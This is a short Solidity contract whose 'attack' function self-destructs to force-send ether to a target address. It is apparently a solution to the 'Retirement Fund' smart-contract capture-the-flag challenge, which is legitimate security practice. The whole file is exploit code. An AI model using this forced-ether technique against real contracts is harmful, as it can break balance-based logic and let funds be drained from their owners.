pragma solidity ^0.7.4;


contract RetirementFundProxy {
    function attack(address payable _target) public payable {
        require(msg.value > 1 wei);
        selfdestruct(_target);
    }
}